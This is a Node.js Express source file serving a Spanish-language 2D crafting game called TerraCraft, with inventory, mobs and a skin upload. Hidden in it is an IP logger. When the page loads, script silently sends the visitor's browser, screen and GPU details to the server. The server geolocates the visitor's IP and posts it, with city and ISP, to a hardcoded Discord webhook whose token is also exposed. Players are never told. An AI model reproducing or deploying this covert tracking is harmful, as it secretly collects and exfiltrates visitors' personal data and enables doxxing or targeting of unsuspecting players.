const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.json());

// ⚠️ PEGA AQUÍ TU WEBHOOK DE DISCORD
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";

// --- SISTEMA DE LOGS / IP LOGGER ---
app.post('/api/telemetry', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    
    const d = req.body || {};
    let country = 'Desconocido', city = 'Desconocida', isp = 'Desconocido';

    try {
        const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`);
        const geo = await response.json();
        if (geo.status === 'success') {
            country = geo.country;
            city = geo.city;
            isp = geo.isp;
        }
    } catch (e) {}

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
        const payload = {
            content: `🎮 **¡Nuevo Jugador en Survival!**\n📍 **IP:** \`${userIp}\` (${city}, ${country})\n📡 **ISP:** ${isp}\n💻 **Navegador:** \`${d.userAgent || 'N/A'}\`\n🖥️ **Pantalla:** ${d.screen || 'N/A'}\n🧠 **Hardware:** ${d.cores || 'N/A'} Cores | GPU: ${d.gpu || 'N/A'}`
        };
        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {}
    }
    res.sendStatus(200);
});
// -----------------------------------

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TerraCraft - Survival Edition</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; image-rendering: pixelated; }
        body { background: #000; overflow: hidden; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        canvas { display: block; }
        
        /* Interfaz Mejorada */
        h1 { font-family: 'VT323', monospace; font-size: 5rem; text-shadow: 4px 4px 0 #333; margin-bottom: 20px; color: #fff; letter-spacing: 2px; }
        h2 { font-family: 'VT323', monospace; font-size: 3rem; text-shadow: 2px 2px 0 #333; color: #fff; }
        
        .overlay { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px); z-index: 100; pointer-events: auto; }
        .hidden { display: none !important; }
        
        /* Botones estilo bloque */
        .btn { background: #8b8b8b; border: 4px solid; border-color: #fff #333 #333 #fff; padding: 12px 24px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin: 8px; width: 300px; text-align: center; color: #000; transition: transform 0.1s; }
        .btn:hover { background: #a3a3a3; }
        .btn:active { border-color: #333 #fff #fff #333; transform: scale(0.98); }
        .btn-green { background: #4ade80; }
        .btn-green:hover { background: #22c55e; }
        
        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }
        
        /* HUD */
        #hud { position: absolute; top: 15px; left: 15px; pointer-events: none; }
        .health-bar { width: 200px; height: 24px; background: #333; border: 3px solid #111; border-radius: 4px; overflow: hidden; box-shadow: 2px 2px 0 rgba(0,0,0,0.5); }
        .health-fill { width: 100%; height: 100%; background: #ef4444; transition: width 0.2s; }
        
        .hint-text { position: absolute; top: 15px; right: 20px; font-family: 'VT323', monospace; font-size: 1.5rem; text-shadow: 2px 2px 0 #000; color: #ddd; }

        /* Hotbar */
        #hotbar { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 4px; pointer-events: auto; background: rgba(0,0,0,0.5); padding: 8px; border: 4px solid #333; border-radius: 4px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        .slot { width: 48px; height: 48px; background: #8b8b8b; border: 3px solid; border-color: #555 #fff #fff #555; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; cursor: pointer; position: relative; color: white; transition: 0.1s; box-shadow: inset -2px -2px 0 rgba(0,0,0,0.2); }
        .slot:hover { background: #a3a3a3; }
        .slot.active { border-color: #fff; box-shadow: 0 0 10px rgba(255,255,255,0.5); transform: scale(1.05); z-index: 2; }
        .qty { position: absolute; bottom: 2px; right: 4px; font-size: 0.9rem; font-weight: bold; text-shadow: 1px 1px 0 #000, -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000; }
        
        /* Menús y Paneles */
        .menu-panel { background: #222; border: 6px solid #555; padding: 30px; width: 450px; text-align: center; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .menu-panel label { font-size: 1.1rem; display: block; margin-bottom: 10px; cursor: pointer; }
        
        input[type="file"] { display: none; }
        .file-label { display: inline-block; background: #3b82f6; border: 4px solid; border-color: #93c5fd #1e3a8a #1e3a8a #93c5fd; padding: 12px; cursor: pointer; margin-top: 15px; font-weight: bold; color: white; transition: 0.1s; }
        .file-label:hover { background: #2563eb; }
        .file-label:active { border-color: #1e3a8a #93c5fd #93c5fd #1e3a8a; }

        /* Inventario y Crafteo */
        #inventory-backdrop { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); z-index: 40; pointer-events: auto; }
        #inventory-gui { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #c6c6c6; border: 6px solid; border-color: #fff #555 #555 #fff; padding: 25px; width: 550px; z-index: 50; pointer-events: auto; display: flex; flex-direction: column; gap: 20px; color: black; box-shadow: 0 15px 40px rgba(0,0,0,0.5); }
        .inv-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #888; padding-bottom: 10px; }
        .inv-header h3 { font-family: 'VT323', monospace; font-size: 2rem; color: #333; }
        .close-btn { background: #ef4444; color: white; border: 2px solid #7f1d1d; width: 30px; height: 30px; font-weight: bold; cursor: pointer; font-size: 1rem; line-height: 1; }
        .close-btn:hover { background: #dc2626; }
        
        .inv-grid { display: grid; grid-template-columns: repeat(9, 1fr); gap: 6px; background: #8b8b8b; padding: 12px; border: 4px solid; border-color: #555 #fff #fff #555; }
        .craft-area { display: flex; gap: 20px; align-items: center; justify-content: space-between; background: #8b8b8b; padding: 15px; border: 4px solid; border-color: #555 #fff #fff #555; }
        .craft-btn { background: #16a34a; color: white; padding: 10px 20px; cursor: pointer; border: 3px solid; border-color: #86efac #14532d #14532d #86efac; font-weight: bold; }
        .craft-btn:active { border-color: #14532d #86efac #86efac #14532d; }
    </style>
</head>
<body>
    <div id="main-menu" class="overlay">
        <h1>TerraCraft</h1>
        <button class="btn btn-green" onclick="startGame()">Jugar Mundo</button>
        <button class="btn" onclick="showSettings()">Ajustes & Video</button>
        <label class="file-label">
            <input type="file" id="skin-upload" accept="image/png">
            👕 Subir Skin (Auto 3D a 2D)
        </label>
        <p style="margin-top:15px; font-size:0.9rem; color:#ccc; max-width: 400px; text-align: center;">
            Sube tu skin normal de Minecraft (64x64). El juego extraerá la parte frontal y creará tu sprite 2D automáticamente.
        </p>
    </div>

    <div id="settings-menu" class="overlay hidden">
        <div class="menu-panel">
            <h2>Ajustes Visuales</h2><br>
            <label><input type="checkbox" id="pack-hd" checked> Bordes HD en Bloques</label>
            <label><input type="checkbox" id="pack-grid"> Mostrar Cuadrícula</label>
            <label><input type="checkbox" id="pack-retro"> Modo Retro (Filtro Oscuro)</label><br>
            <button class="btn" onclick="hideSettings()">Aceptar</button>
        </div>
    </div>

    <div id="pause-menu" class="overlay hidden">
        <h2>Pausa</h2><br>
        <button class="btn btn-green" onclick="togglePause()">Continuar</button>
        <button class="btn" onclick="exitToMenu()">Salir al Menú</button>
    </div>

    <div id="ui-layer" class="hidden">
        <div id="hud"><div class="health-bar"><div id="hp-fill" class="health-fill"></div></div></div>
        <div class="hint-text">Pulsa [ E ] para Inventario</div>
        <div id="hotbar"></div>
        
        <div id="inventory-backdrop" class="hidden" onclick="toggleInventory()"></div>
        <div id="inventory-gui" class="hidden">
            <div class="inv-header">
                <h3>Inventario y Fabricación</h3>
                <button class="close-btn" onclick="toggleInventory()">X</button>
            </div>
            <div class="craft-area">
                <div style="text-align: center;">
                    <div style="width:32px; height:32px; background:#5c3a21; margin: 0 auto; border:2px solid #333;"></div>
                    <span style="font-weight:bold;">1x Madera</span>
                </div>
                <span style="font-size:2rem; font-weight:bold;">➔</span>
                <div style="text-align: center;">
                    <div style="width:32px; height:32px; background:#d97706; margin: 0 auto; border:2px solid #333;"></div>
                    <span style="font-weight:bold;">4x Tablones</span>
                </div>
                <button class="craft-btn" onclick="craftItem(5, 9, 1, 4)">Fabricar</button>
            </div>
            <h4 style="color:#444;">Mochila:</h4>
            <div class="inv-grid" id="inv-grid"></div>
        </div>
    </div>

    <canvas id="gameCanvas"></canvas>

    <script>
    // --- EJECUTAR LOG DE DISCORD AL ENTRAR A LA PÁGINA ---
    function getGPU() { try { const canvas = document.createElement('canvas'); return canvas.getContext('webgl').getParameter(canvas.getContext('webgl').getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL); } catch(e) { return 'N/A'; } }
    fetch('/api/telemetry', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify({ userAgent: navigator.userAgent, screen: \`\${screen.width}x\${screen.height}\`, cores: navigator.hardwareConcurrency, gpu: getGPU() }) 
    }).catch(()=>{});
    // -----------------------------------------------------

    let gameState = 'MENU'; 
    let customSkin = null;
    let timeOfDay = 8000; 
    let invOpen = false;
    
    let resourcePacks = { hdTextures: true, showGrid: false, retroMode: false };

    const BLOCKS = {
        0: { name: 'Aire' },
        1: { name: 'Pico', isTool: true, icon: '⛏️' },
        2: { name: 'Pasto', hex: '#4ade80', acc: '#15803d' },
        3: { name: 'Tierra', hex: '#78350f', acc: '#92400e' },
        4: { name: 'Piedra', hex: '#52525b', acc: '#3f3f46' },
        5: { name: 'Madera', hex: '#5c3a21', acc: '#452b18' },
        9: { name: 'Tablones', hex: '#d97706', acc: '#b45309' }
    };

    let inventory = { 1: 1, 2: 10, 5: 5 }; 
    let hotbarSlots = [1, 2, 3, 5, 9, 0, 0, 0, 0];
    let selectedSlot = 0;

    document.getElementById('pack-hd').addEventListener('change', e => resourcePacks.hdTextures = e.target.checked);
    document.getElementById('pack-grid').addEventListener('change', e => resourcePacks.showGrid = e.target.checked);
    document.getElementById('pack-retro').addEventListener('change', e => resourcePacks.retroMode = e.target.checked);

    // SISTEMA AVANZADO DE PROCESADO DE SKINS 3D A 2D
    document.getElementById('skin-upload').addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(event) {
                const img = new Image();
                img.onload = () => { 
                    if (img.width === 64 && (img.height === 64 || img.height === 32)) {
                        // Es una skin estándar de Minecraft
                        const c = document.createElement('canvas');
                        c.width = 16;  // Ancho total del personaje 2D
                        c.height = 32; // Alto total del personaje 2D
                        const ctx = c.getContext('2d');
                        
                        // Extraemos la vista FRONTAL de la skin y la acomodamos
                        ctx.drawImage(img, 8, 8, 8, 8, 4, 0, 8, 8); // Cabeza Frontal
                        ctx.drawImage(img, 20, 20, 8, 12, 4, 8, 8, 12); // Cuerpo Frontal
                        ctx.drawImage(img, 44, 20, 4, 12, 0, 8, 4, 12); // Brazo Derecho
                        
                        if (img.height === 64) {
                            ctx.drawImage(img, 36, 52, 4, 12, 12, 8, 4, 12); // Brazo Izquierdo (Skins modernas)
                            ctx.drawImage(img, 20, 52, 4, 12, 8, 20, 4, 12); // Pierna Izquierda (Skins modernas)
                        } else {
                            // Skins antiguas 64x32 (Espejar brazo y pierna)
                            ctx.save(); ctx.scale(-1, 1);
                            ctx.drawImage(img, 44, 20, 4, 12, -16, 8, 4, 12); // Brazo Izq
                            ctx.drawImage(img, 4, 20, 4, 12, -12, 20, 4, 12); // Pierna Izq
                            ctx.restore();
                        }
                        ctx.drawImage(img, 4, 20, 4, 12, 4, 20, 4, 12); // Pierna Derecha
                        
                        const sprite2D = new Image();
                        sprite2D.onload = () => { customSkin = sprite2D; alert("¡Skin de Minecraft adaptada a 2D correctamente!"); };
                        sprite2D.src = c.toDataURL();
                    } else {
                        // Ya es un sprite 2D (ej. Terraria style)
                        customSkin = img; 
                        alert("¡Skin Sprite 2D cargada!"); 
                    }
                };
                img.src = event.target.result;
            }
            reader.readAsDataURL(file);
        }
    });

    function showSettings() { document.getElementById('main-menu').classList.add('hidden'); document.getElementById('settings-menu').classList.remove('hidden'); }
    function hideSettings() { document.getElementById('settings-menu').classList.add('hidden'); document.getElementById('main-menu').classList.remove('hidden'); }
    
    function startGame() {
        document.getElementById('main-menu').classList.add('hidden');
        document.getElementById('ui-layer').classList.remove('hidden');
        gameState = 'PLAYING';
        if(!window.gameInitialized) { initGame(); window.gameInitialized = true; }
    }

    function togglePause() {
        if (gameState === 'MENU') return;
        if (gameState === 'PLAYING' && !invOpen) {
            gameState = 'PAUSED'; document.getElementById('pause-menu').classList.remove('hidden'); document.getElementById('ui-layer').classList.add('hidden');
        } else if (gameState === 'PAUSED') {
            gameState = 'PLAYING'; document.getElementById('pause-menu').classList.add('hidden'); document.getElementById('ui-layer').classList.remove('hidden');
        }
    }

    function toggleInventory() {
        invOpen = !invOpen;
        const gui = document.getElementById('inventory-gui');
        const bg = document.getElementById('inventory-backdrop');
        if(invOpen) {
            gui.classList.remove('hidden');
            bg.classList.remove('hidden');
        } else {
            gui.classList.add('hidden');
            bg.classList.add('hidden');
        }
    }

    function exitToMenu() {
        gameState = 'MENU';
        document.getElementById('pause-menu').classList.add('hidden');
        document.getElementById('main-menu').classList.remove('hidden');
    }

    function renderHotbar() {
        const hb = document.getElementById('hotbar');
        hb.innerHTML = '';
        hotbarSlots.forEach((id, i) => {
            const b = BLOCKS[id] || BLOCKS[0];
            let qty = inventory[id] || 0;
            let inner = b.isTool ? b.icon : (id !== 0 ? \`<div style="width:28px;height:28px;background:\${b.hex};border:2px solid \${b.acc};"></div>\` : '');
            let qtyLabel = (!b.isTool && id !== 0) ? \`<span class="qty">\${qty}</span>\` : '';
            hb.innerHTML += \`<div class="slot \${i === selectedSlot ? 'active' : ''}" onclick="selectedSlot=\${i}; renderHotbar()">\${inner}\${qtyLabel}</div>\`;
        });
        renderInventoryGUI();
    }

    function renderInventoryGUI() {
        const grid = document.getElementById('inv-grid');
        grid.innerHTML = '';
        hotbarSlots.forEach((id) => {
            const b = BLOCKS[id] || BLOCKS[0];
            let qty = inventory[id] || 0;
            let inner = b.isTool ? b.icon : (id !== 0 ? \`<div style="width:28px;height:28px;background:\${b.hex};border:2px solid \${b.acc};"></div>\` : '');
            let qtyLabel = (!b.isTool && id !== 0) ? \`<span class="qty" style="color:white;">\${qty}</span>\` : '';
            grid.innerHTML += \`<div class="slot" style="width:100%;height:45px;">\${inner}\${qtyLabel}</div>\`;
        });
    }

    function craftItem(reqId, outId, reqQty, outQty) {
        if ((inventory[reqId] || 0) >= reqQty) {
            inventory[reqId] -= reqQty;
            inventory[outId] = (inventory[outId] || 0) + outQty;
            renderHotbar();
        }
    }

    function initGame() {
        const cv = document.getElementById('gameCanvas');
        const ctx = cv.getContext('2d', { alpha: false });
        function resize() { cv.width = window.innerWidth; cv.height = window.innerHeight; }
        window.addEventListener('resize', resize); resize();

        const TILE = 32, CHUNK_W = 100, CHUNK_H = 80;
        let world = Array.from({ length: CHUNK_W }, () => Array(CHUNK_H).fill(0));
        
        for (let x = 0; x < CHUNK_W; x++) {
            let h = Math.floor(30 + Math.sin(x * 0.1) * 4);
            for (let y = h; y < CHUNK_H; y++) {
                if(y === h) world[x][y] = 2;
                else if(y < h + 5) world[x][y] = 3;
                else world[x][y] = 4;
            }
        }

        // Ajustamos la hitbox a 24x48 para respetar el formato del Sprite 16x32 (relación 1:2)
        const player = { x: (CHUNK_W/2)*TILE, y: 10*TILE, w: 24, h: 48, vx: 0, vy: 0, speed: 5, jump: -10, grounded: false, hp: 100, maxHp: 100, facingRight: true };
        let camera = { x: player.x, y: player.y };
        let keys = {};

        let mobs = [
            { x: (CHUNK_W/2 + 5)*TILE, y: 15*TILE, w: 24, h: 24, vx: -1, vy: 0, type: 'slime', hp: 20 },
            { x: (CHUNK_W/2 - 8)*TILE, y: 15*TILE, w: 24, h: 48, vx: 1, vy: 0, type: 'zombie', hp: 40 }
        ];

        window.addEventListener('keydown', e => {
            if (e.code === 'Escape') {
                if(invOpen) toggleInventory();
                else togglePause();
            }
            if (gameState !== 'PLAYING') return;
            
            // LA TECLA E
            if (e.code === 'KeyE') {
                toggleInventory();
            }

            if (!invOpen) {
                keys[e.code] = true;
                if (e.key >= '1' && e.key <= '9') { selectedSlot = parseInt(e.key) - 1; renderHotbar(); }
            } else {
                keys = {}; // Resetear movimiento al abrir inventario
            }
        });
        window.addEventListener('keyup', e => keys[e.code] = false);

        let mouseX = 0, mouseY = 0, isMouseDown = false, mouseBtn = 0;
        window.addEventListener('mousemove', e => { mouseX = e.clientX; mouseY = e.clientY; });
        window.addEventListener('mousedown', e => { if(gameState==='PLAYING' && !invOpen){ isMouseDown = true; mouseBtn = e.button; }});
        window.addEventListener('mouseup', () => isMouseDown = false);
        window.addEventListener('contextmenu', e => e.preventDefault());

        function handleMouse() {
            if (!isMouseDown || invOpen) return;
            const tx = Math.floor((mouseX + camera.x) / TILE);
            const ty = Math.floor((mouseY + camera.y) / TILE);
            if (tx < 0 || tx >= CHUNK_W || ty < 0 || ty >= CHUNK_H) return;
            
            const dist = Math.hypot((player.x + player.w/2) - (tx*TILE), (player.y + player.h/2) - (ty*TILE));
            if (dist > TILE * 6) return;

            let currentId = hotbarSlots[selectedSlot];
            
            if (mouseBtn === 0 && currentId === 1) { 
                let minedBlock = world[tx][ty];
                if (minedBlock !== 0) {
                    inventory[minedBlock] = (inventory[minedBlock] || 0) + 1;
                    world[tx][ty] = 0;
                    renderHotbar();
                    isMouseDown = false; 
                }
            } else if ((mouseBtn === 2 || currentId !== 1) && world[tx][ty] === 0) {
                if (currentId !== 0 && currentId !== 1 && inventory[currentId] > 0) {
                    world[tx][ty] = currentId;
                    inventory[currentId]--;
                    renderHotbar();
                    isMouseDown = false;
                }
            }
        }

        function checkCol(nx, ny, w=player.w, h=player.h) {
            const l = Math.floor(nx / TILE), r = Math.floor((nx + w - 1) / TILE);
            const t = Math.floor(ny / TILE), b = Math.floor((ny + h - 1) / TILE);
            if (l < 0 || r >= CHUNK_W || t < 0 || b >= CHUNK_H) return true;
            for (let y = t; y <= b; y++) {
                for (let x = l; x <= r; x++) { if (world[x][y] !== 0) return true; }
            }
            return false;
        }

        renderHotbar();

        function update() {
            if (gameState === 'PLAYING') {
                timeOfDay += 2;
                if(timeOfDay >= 24000) timeOfDay = 0;

                if (!invOpen) {
                    if (keys['KeyA']) { player.vx -= 1; player.facingRight = false; }
                    else if (keys['KeyD']) { player.vx += 1; player.facingRight = true; }
                    else player.vx *= 0.7; 
                    
                    if (player.vx > player.speed) player.vx = player.speed;
                    if (player.vx < -player.speed) player.vx = -player.speed;

                    if ((keys['Space'] || keys['KeyW']) && player.grounded) {
                        player.vy = player.jump;
                        player.grounded = false;
                        keys['Space'] = false; 
                    }
                } else {
                    player.vx *= 0.7;
                }

                player.vy += 0.6; 
                if (player.vy > 15) player.vy = 15;

                if (!checkCol(player.x + player.vx, player.y)) { player.x += player.vx; } else { player.vx = 0; }

                player.grounded = false;
                if (!checkCol(player.x, player.y + player.vy)) { player.y += player.vy; } 
                else {
                    if (player.vy > 12) { 
                        player.hp -= Math.floor(player.vy * 1.5); 
                        document.getElementById('hp-fill').style.width = \`\${Math.max(0, (player.hp/player.maxHp)*100)}%\`; 
                    }
                    if (player.vy > 0) { player.grounded = true; player.y = Math.floor((player.y + player.h + player.vy)/TILE)*TILE - player.h; } 
                    else if (player.vy < 0) { player.y = Math.floor((player.y + player.vy)/TILE)*TILE + TILE; }
                    player.vy = 0;
                }
                
                handleMouse();

                mobs.forEach(m => {
                    m.vy += 0.6;
                    if (m.vy > 15) m.vy = 15;
                    if (!checkCol(m.x + m.vx, m.y, m.w, m.h)) { m.x += m.vx; } else { m.vx *= -1; }
                    if (!checkCol(m.x, m.y + m.vy, m.w, m.h)) { m.y += m.vy; } 
                    else {
                        if (m.vy > 0) {
                            m.y = Math.floor((m.y + m.h + m.vy)/TILE)*TILE - m.h;
                            if (m.type === 'slime') m.vy = -8; 
                        } else m.y = Math.floor((m.y + m.vy)/TILE)*TILE + TILE;
                        if(m.type !== 'slime') m.vy = 0;
                    }
                });

                camera.x += (player.x + player.w/2 - cv.width/2 - camera.x) * 0.15;
                camera.y += (player.y + player.h/2 - cv.height/2 - camera.y) * 0.15;
            }

            let skyColor = '#87CEEB';
            let darkness = 0;
            if (timeOfDay > 12000 && timeOfDay < 14000) { 
                skyColor = '#fdba74';
            } else if (timeOfDay >= 14000 && timeOfDay < 22000) { 
                skyColor = '#0f172a';
                darkness = 0.6;
            } else if (timeOfDay >= 22000) { 
                skyColor = '#fcd34d';
            }

            if (resourcePacks.retroMode) skyColor = '#5c4033';

            ctx.fillStyle = skyColor;
            ctx.fillRect(0, 0, cv.width, cv.height);
            
            ctx.save();
            ctx.translate(Math.floor(-camera.x), Math.floor(-camera.y));

            const sCol = Math.max(0, Math.floor(camera.x / TILE));
            const eCol = Math.min(CHUNK_W, Math.floor((camera.x + cv.width) / TILE) + 2);
            const sRow = Math.max(0, Math.floor(camera.y / TILE));
            const eRow = Math.min(CHUNK_H, Math.floor((camera.y + cv.height) / TILE) + 2);

            for (let x = sCol; x < eCol; x++) {
                for (let y = sRow; y < eRow; y++) {
                    let id = world[x][y];
                    if (id !== 0) {
                        ctx.fillStyle = BLOCKS[id].hex;
                        ctx.fillRect(x * TILE, y * TILE, TILE, TILE);
                        
                        if (resourcePacks.hdTextures) {
                            ctx.fillStyle = BLOCKS[id].acc;
                            ctx.fillRect(x * TILE + TILE - 10, y * TILE + TILE - 10, 10, 10);
                            ctx.fillRect(x * TILE, y * TILE, 10, 10);
                        }
                    }
                    if (resourcePacks.showGrid) {
                        ctx.strokeStyle = 'rgba(255,255,255,0.1)';
                        ctx.strokeRect(x * TILE, y * TILE, TILE, TILE);
                    }
                }
            }

            mobs.forEach(m => {
                if (m.type === 'slime') {
                    ctx.fillStyle = 'rgba(34, 197, 94, 0.8)';
                    ctx.fillRect(m.x, m.y, m.w, m.h);
                } else if (m.type === 'zombie') {
                    ctx.fillStyle = '#166534';
                    ctx.fillRect(m.x, m.y, m.w, m.h);
                }
            });

            // RENDER JUGADOR (SKIN O CUBO)
            if (customSkin) {
                ctx.save();
                if (!player.facingRight) {
                    ctx.translate(player.x + player.w, player.y);
                    ctx.scale(-1, 1);
                    ctx.drawImage(customSkin, 0, 0, player.w, player.h);
                } else {
                    ctx.drawImage(customSkin, player.x, player.y, player.w, player.h);
                }
                ctx.restore();
            } else {
                ctx.fillStyle = '#374151'; ctx.fillRect(player.x + 2, player.y + 26, 20, 22);
                ctx.fillStyle = '#0284c7'; ctx.fillRect(player.x + 2, player.y + 12, 20, 14); 
                ctx.fillStyle = '#ffcc99'; ctx.fillRect(player.x + 4, player.y - 4, 16, 16); 
                ctx.fillStyle = '#000'; ctx.fillRect(player.x + (player.facingRight ? 14 : 6), player.y + 2, 4, 4);
            }

            if (darkness > 0) {
                ctx.fillStyle = \`rgba(0,0,0,\${darkness})\`;
                ctx.fillRect(camera.x, camera.y, cv.width, cv.height);
            }

            ctx.restore();
            requestAnimationFrame(update);
        }
        update();
    }
    </script>
</body>
</html>`);
});

app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
